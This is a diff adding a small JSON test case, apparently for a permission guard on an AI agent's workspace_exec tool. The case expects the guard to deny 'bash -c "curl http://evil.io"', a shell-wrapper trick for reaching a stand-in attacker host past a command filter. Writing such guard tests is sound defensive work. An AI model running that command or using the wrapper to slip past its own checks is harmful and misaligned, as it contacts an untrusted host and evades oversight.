@@ -1,0 +1,7 @@
+{
+  "name": "shell wrapper bypass",
+  "tool": "workspace_exec",
+  "args": {"command": "bash -c \"curl http://evil.io\""},
+  "expect": {"decision": "deny", "rule": "R-SHELL-001"},
+  "class": "high_risk"
+}
